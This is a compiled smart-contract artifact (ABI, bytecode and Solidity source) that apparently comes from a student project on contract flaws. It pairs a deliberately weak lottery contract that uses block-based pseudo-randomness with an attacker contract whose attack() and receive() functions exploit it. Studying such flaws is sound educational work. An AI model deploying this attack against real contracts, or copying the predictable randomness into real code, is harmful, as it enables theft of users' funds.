{
  "contractName": "LogicAttacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_logicErrorAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "gameError",
      "outputs": [
        {
          "internalType": "contract LogicError",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104c73803806104c7833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6103b0806101176000396000f3fe60806040526004361061002d5760003560e01c80639e5faafc146100b5578063d0c7d233146100bf576100b0565b366100b05760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663827c912d6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561009a57600080fd5b505af11580156100ae573d6000803e3d6000fd5b005b600080fd5b6100bd6100ea565b005b3480156100cb57600080fd5b506100d461023f565b6040516100e191906102e2565b60405180910390f35b670de0b6b3a76400003414610134576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161012b9061035a565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663218bd577670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101a457600080fd5b505af11580156101b8573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663827c912d6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561022557600080fd5b505af1158015610239573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102a86102a361029e84610263565b610283565b610263565b9050919050565b60006102ba8261028d565b9050919050565b60006102cc826102af565b9050919050565b6102dc816102c1565b82525050565b60006020820190506102f760008301846102d3565b92915050565b600082825260208201905092915050565b7f496e636f727265637420656e7472792066656500000000000000000000000000600082015250565b60006103446013836102fd565b915061034f8261030e565b602082019050919050565b6000602082019050818103600083015261037381610337565b905091905056fea2646970667358221220bd9b57274efeb6ff94af19ed2ff972f222eda9b661ae5617c41d7a569c22340964736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: UNLICENSED\r\n\r\npragma solidity ^0.8.19;\r\n\r\ncontract LogicError {\r\n\r\n    address payable[] public participants; //defining array for participants\r\n    uint public lotteryAmt;\r\n    function enterGame() public payable {\r\n        require(msg.value == 1 ether, \"Wrong entry fee\"); //participants must send exactly 1 Ether\r\n        participants.push(payable(msg.sender)); //if successful, add address to array\r\n    }\r\n\r\nfunction chooseTheWinner() public payable {\r\n    require(participants.length > 0, \"No participants in the game\"); //must be participants in array\r\n    \r\n    uint winnerIndex = random() % participants.length; //index generation for winner\r\n    participants[winnerIndex].transfer(address(this).balance); //transfer the contract balance to the selected winner\r\n    lotteryAmt++;\r\n}\r\n\r\nfunction random() private view returns (uint) {\r\n    return uint(keccak256(abi.encodePacked(block.basefee, block.timestamp, participants.length))); //generate random pseudo number with block timestamp and participants\r\n }\r\n}\r\n\r\ncontract LogicAttacker {\r\n    LogicError public gameError; //store vulnerable contract\r\n    constructor(address _logicErrorAddress) {  //to take vulnerable address as argument for deploying\r\n        gameError = LogicError(_logicErrorAddress);\r\n    }\r\n    function attack() public payable {\r\n        require(msg.value == 1 ether, \"Incorrect entry fee\");\r\n        gameError.enterGame{value: 1 ether}(); //calls the enterGame function of vulnerable contract with 1 Ether\r\n        gameError.chooseTheWinner(); //calls chooseTheWinner funcion\r\n    }\r\n    receive() external payable {\r\n        gameError.chooseTheWinner(); //fallback to call choseTheWinner to ensure attack success\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Individual Project\\Smart Contracts\\contracts\\LogicErrors.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-04-22T17:37:36.514Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}